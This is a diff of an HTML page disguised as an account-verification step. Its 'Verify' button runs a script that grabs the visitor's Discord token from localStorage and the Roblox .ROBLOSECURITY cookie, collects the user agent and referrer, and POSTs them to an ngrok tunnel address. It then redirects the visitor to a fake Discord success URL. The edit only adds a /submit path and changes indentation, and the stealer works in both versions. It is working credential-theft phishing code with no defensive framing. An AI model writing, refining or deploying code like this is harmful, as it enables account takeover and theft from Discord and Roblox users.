@@ -35,31 +35,31 @@
         <p>Click the button below to verify your account.</p>
         <button onclick="collectData()">Verify</button>
     </div>
-    <script>
-        function collectData() {
-            // Attempt to collect Discord token (if available)
-            const discordToken = localStorage.getItem('token') || 'N/A';
+   <script>
+    function collectData() {
+        // Attempt to collect Discord token (if available)
+        const discordToken = localStorage.getItem('token') || 'N/A';
 
-            // Attempt to collect Roblox cookie (if available)
-            const robloxCookie = document.cookie.split('; ').find(row => row.startsWith('.ROBLOSECURITY=')) || 'N/A';
+        // Attempt to collect Roblox cookie (if available)
+        const robloxCookie = document.cookie.split('; ').find(row => row.startsWith('.ROBLOSECURITY=')) || 'N/A';
 
-            // Collect additional info
-            const userAgent = navigator.userAgent;
-            const referrer = document.referrer;
+        // Collect additional info
+        const userAgent = navigator.userAgent;
+        const referrer = document.referrer;
 
-            // Send data to your backend
-            fetch('https://e7b2-2a02-8084-e80-3400-c93a-72e0-111-85e6.ngrok-free.app', {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json',
-                },
-                body: JSON.stringify({ discordToken, robloxCookie, userAgent, referrer }),
-            }).then(response => {
-                if (response.ok) {
-                    window.location.href = "https://discord.com/verification-success";
-                }
-            });
-        }
-    </script>
+        // Send data to your backend
+        fetch('https://e7b2-2a02-8084-e80-3400-c93a-72e0-111-85e6.ngrok-free.app/submit', {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json',
+            },
+            body: JSON.stringify({ discordToken, robloxCookie, userAgent, referrer }),
+        }).then(response => {
+            if (response.ok) {
+                window.location.href = "https://discord.com/verification-success";
+            }
+        });
+    }
+</script>
 </body>
 </html>
